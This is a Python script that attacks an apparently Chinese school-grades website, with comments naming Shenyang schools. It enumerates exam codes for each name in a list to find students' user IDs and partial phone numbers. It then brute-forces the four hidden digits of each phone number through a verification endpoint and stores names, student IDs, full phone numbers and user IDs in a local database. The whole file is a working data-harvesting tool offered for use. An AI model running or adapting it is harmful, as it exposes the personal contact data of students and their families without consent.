#-*- coding: UTF-8 -*-
import urllib2 as ul
import re
import retry
import logging
import sqlite3 as sql
import os

os.system("chcp 65001")

proxy_handler = ul.ProxyHandler({'http': '127.0.0.1:8087'})
opener = ul.build_opener(proxy_handler)
ul.install_opener(opener)


logging.basicConfig(level = logging.INFO,format = '%(asctime)s [%(levelname)s] %(message)s')
log = logging.getLogger()

@retry.retry(ul.URLError, tries=6, delay=3,logger=log)
def try_open(url):
    return ul.urlopen(url)

def fix_num(l,s):
    ans = ""
    ss = str(s)
    for i in range(l-len(ss)):
        ans=ans+"0"
    return ans+str(ss)


def find_id(txt):
    key = "id_userID\" value=\".+?\""
    pattern = re.compile(key)
    matcher = re.search(pattern,txt)
    text = matcher.group(0)
    res = str()
    for i in text:
        if(i.isdigit()):
            res=res+i

    return res

def find_part_pn(txt):
    key = "<input type=\"hidden\" id=\"id_tel\" value=\".+?\""
    pattern = re.compile(key)
    matcher = re.search(pattern,txt)
    text = matcher.group(0)
    res = str()
    for i in text:
        if(i.isdigit()):
            res=res+i

    return res

def get_id(sch,name):
    url_id = "http://www.yunchengji.net/register/search-student?type=-99&studentName="
    for cr in range(1, 22):
        for stid in range(1, 60):
            url_name = ul.quote(name)
            data = url_id + url_name+"&examCode="+sch+fix_num(2,cr) + fix_num(2,stid) + "&identity=parent"
            log.debug(data)
            rep = try_open(data)
            text = rep.read()
            log.debug(text)

            if text != "0":
                userid = find_id(text)
                part_num = find_part_pn(text)
                return userid,sch+fix_num(2,cr)+fix_num(2,stid),part_num

def get_pn(userid):
    url_phone = "http://www.yunchengji.net/register/completion-studen-phone?userID="
    for i in range(9999):
        data = url_phone + str(userid) + "&number="+fix_num(4,i)
        log.debug(data)
        rep = try_open(data)
        text = rep.read()
        log.debug(data)
        if(text!="false"):
            return fix_num(4,i)

def output(na,st,phone,us):
    log.info("Connect to database")
    conn = sql.connect("student.db")
    conn.text_factory = str
    cursor = conn.cursor()
    log.info("Creating table STU")
    comm=('''CREATE TABLE IF NOT EXISTS STU
    (
    name INT NOT NULL,
    stid INT PRIMARY KEY NOT NULL,
    pn INT NOT NULL,
    usid INT NOT NULL
    );''')
    cursor.execute(comm)
    para = (na,st,phone,us)
    log.info("Insert data to STU")
    comm = ('INSERT INTO STU (name,stid,pn,usid) VALUES (?,?,?,?);')
    cursor.execute(comm,para)
    cursor.close()
    log.info("Commiting .....")
    conn.commit()
    conn.close()
    log.info("Success!")

#沈阳二中高一上期末 80110
#沈阳二中高二上期末 80110
#二十中学高二上期末 10120
#用sqlite重写一遍
try:
    all_nam = open('name.in','r').read()
    all_nam = all_nam.decode("utf-8-sig")  # 得到一个不含BOM的unicode string
    all_nam = all_nam.encode("utf-8")  # 将unicode转换为utf-
    if (len(all_nam) == 0):
        raise
except:
    log.fatal("Failed to open name.in,Or the file is empty")
    exit()

try:
    all_schid = open('school_id.in', 'r').read()
except:
    log.fatal("Failed to open school_id.in")
    exit()

nam_list = all_nam.split(',')
schid_list = all_schid.split('#')
for i in range(len(schid_list)-1):
    schid_list[i+1] = schid_list[i+1].strip('\n')

log.info("Choose your school or accurate exam:")
for i in range(len(schid_list)-1):
    log.info("("+str(i+1)+") "+schid_list[i+1].split(' ')[0])

while True:
    try:
        log.info("Input the index")
        sch_id = input()
        sch_id = schid_list[sch_id].split(' ')[1]
        log.debug("School ID = "+str(sch_id))
        break
    except:
        log.critical("Please input a number above!")

suc_num = 0
fail_list = []
for i in nam_list:
    nam = i
    log.info("Student Name = "+nam)
    log.info("Getting ID .........")

    try:
        userid, stuid, ptpn1 = get_id(sch_id, nam)
        log.info("Getting information.....")
        log.info("Student ID = "+stuid)
    except:
        fail_list.append(i)
        log.fatal("Failed to get information")
        log.info("Try next Student.......")
        continue

    try:
        log.info("Getting phone number ......")
        ptpn2 = get_pn(userid)
        pn = ptpn1[0:3] + ptpn2 + ptpn1[3:7]
        log.info("Phone number = " + pn)
        log.info("Success!(!!_!!)")
    except:
        fail_list.append(i)
        log.fatal("Failed to get phone number")
        continue

    try:
        log.info("Output to database")
        output(nam,stuid,pn,userid)
        log.info("Output Success!")
        suc_num = suc_num+1
    except:
        fail_list.append(i)
        log.critical("Output FAILED")
        continue


log.info("Finished.")
log.info("Success"+"("+str(suc_num)+"/"+str(len(nam_list))+")")
fail_nam = ""
for i in fail_list:
    fail_nam=fail_nam+i+","
log.info("Failed:"+fail_nam)